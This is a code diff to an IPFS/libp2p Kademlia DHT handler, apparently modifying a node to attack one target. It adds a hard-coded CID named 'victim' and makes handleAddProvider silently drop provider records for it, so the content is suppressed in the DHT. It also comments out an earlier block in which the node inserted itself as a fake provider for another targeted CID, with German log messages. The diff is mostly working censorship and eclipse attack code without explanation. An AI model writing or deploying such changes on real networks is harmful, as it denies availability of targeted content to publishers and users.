@@ -21,6 +21,7 @@ import (
 
 // The number of closer peers to send on requests.
 var CloserPeerCount = KValue
+var victim = "QmNnRuUaowmVav1KyVbzuB3ABReep4v7PxQgaK1ZEisC1Q"
 
 // dhthandler specifies the signature of functions that handle DHT messages.
 type dhtHandler func(context.Context, peer.ID, *pb.Message) (*pb.Message, error)
@@ -304,8 +305,8 @@ func (dht *IpfsDHT) handleGetProviders(ctx context.Context, p peer.ID, pmes *pb.
 
 	// debug logging niceness.
 	reqDesc := fmt.Sprintf("%s handleGetProviders(%s, %s): ", dht.self, p, c)
-	logger.Infof("%s begin", reqDesc)
-	defer logger.Infof("%s end", reqDesc)
+	logger.Debugf("%s begin", reqDesc)
+	defer logger.Debugf("%s end", reqDesc)
 
 	// check if we have this value, to add ourselves as provider.
 	has, err := dht.datastore.Has(convertToDsKey(c.Bytes()))
@@ -321,11 +322,11 @@ func (dht *IpfsDHT) handleGetProviders(ctx context.Context, p peer.ID, pmes *pb.
 		logger.Debugf("%s have the value. added self as provider", reqDesc)
 	}
 
-	if c.String() == "QmQ9DMCmJPMMcTDonXG6Yog2Zw7Ke53r72Zr8xBMkRzt6U" {
-		//logger.Info("!!! ALARM - ANFRAGE FÜR LASCUOLADISIMONE EINGEGANGEN !!!")
-		logger.Info("!!!!!!!!! Füge mich selbst als Provider hinzu. Mal schauen, was passiert.")
-		providers = append(providers, dht.self)
-	}
+	//if c.String() == victim {
+	//logger.Info("!!! ALARM - ANFRAGE FÜR LASCUOLADISIMONE EINGEGANGEN !!!")
+	//logger.Info("!!!!!!!!! Füge mich selbst als Provider hinzu. Mal schauen, was passiert.")
+	//providers = append(providers, dht.self)
+	//}
 
 	if providers != nil && len(providers) > 0 {
 		infos := pstore.PeerInfos(dht.peerstore, providers)
@@ -355,7 +356,7 @@ func (dht *IpfsDHT) handleAddProvider(ctx context.Context, p peer.ID, pmes *pb.M
 	}
 	logger.SetTag(ctx, "key", c)
 
-	if c.String() != "QmQ9DMCmJPMMcTDonXG6Yog2Zw7Ke53r72Zr8xBMkRzt6U" {
+	if c.String() != victim {
 		logger.Debugf("%s adding %s as a provider for '%s'\n", dht.self, p, c)
 	} else {
 		logger.Infof("!!!!!!!!! %s NOT adding %s as a provider for '%s'\n", dht.self, p, c)
@@ -382,7 +383,7 @@ func (dht *IpfsDHT) handleAddProvider(ctx context.Context, p peer.ID, pmes *pb.M
 			dht.peerstore.AddAddrs(pi.ID, pi.Addrs, pstore.ProviderAddrTTL)
 		}
 
-		if c.String() != "QmQ9DMCmJPMMcTDonXG6Yog2Zw7Ke53r72Zr8xBMkRzt6U" {
+		if c.String() != victim {
 			dht.providers.AddProvider(ctx, c, p)
 		}
 	}
